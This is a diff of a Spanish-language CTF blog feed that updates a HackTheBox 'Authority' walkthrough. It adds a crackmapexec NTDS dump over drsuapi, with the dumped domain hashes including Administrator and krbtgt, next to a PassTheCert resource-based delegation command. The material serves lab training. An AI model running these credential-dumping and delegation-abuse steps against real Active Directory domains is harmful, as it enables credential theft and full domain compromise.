@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-11T00:07:34-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-11T00:37:09-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
 </subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Authority (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html" rel="alternate" type="text/html" title="HackTheBox - Authority (medium)" /><published>2024-07-10T00:00:00-06:00</published><updated>2024-07-10T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/e6257bbacb2ddd56f5703bb61eadd8cb.png" />
 </p>
@@ -961,11 +961,27 @@ SMB         10.10.11.222    445    AUTHORITY        [+] Added 3 SAM hashes to th
 
 <ul>
   <li>
-    <p>Por alguna razón el hash que nos da <code class="language-plaintext highlighter-rouge">crackmapexec</code> no es correcto pero podemos solicitarlo de otra forma.</p>
+    <p>El hash que nos da <code class="language-plaintext highlighter-rouge">crackmapexec</code> no es correcto por que al poner <code class="language-plaintext highlighter-rouge">--sam</code> el hash es el local y no el del AD.</p>
   </li>
   <li>
-    <p>Vamos a usar write_rbcd para darle permisos de <code class="language-plaintext highlighter-rouge">delegration</code> sobre el DC.</p>
+    <p>Para tener los hashes del AD y tener el correcto del administrador debemos usar <code class="language-plaintext highlighter-rouge">--ntds drsuapi</code>.</p>
   </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">--ntds</span> drsuapi
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
+SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.11.222    445    AUTHORITY        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
+SMB         10.10.11.222    445    AUTHORITY        svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
+SMB         10.10.11.222    445    AUTHORITY        AUTHORITY<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:9fe3805afb034743bed6e360c103115e:::
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] Dumped 5 NTDS hashes to /home/miguel/.cme/logs/AUTHORITY_10.10.11.222_2024-07-11_003637.ntds of which 4 were added to the database
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar write_rbcd para darle permisos de <code class="language-plaintext highlighter-rouge">delegration</code> sobre el DC.</li>
 </ul>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 /opt/PassTheCert/Python/passthecert.py <span class="nt">-action</span> write_rbcd <span class="nt">-delegate-to</span> <span class="s1">'AUTHORITY$'</span> <span class="nt">-delegate-from</span> <span class="s1">'miguel$'</span> <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
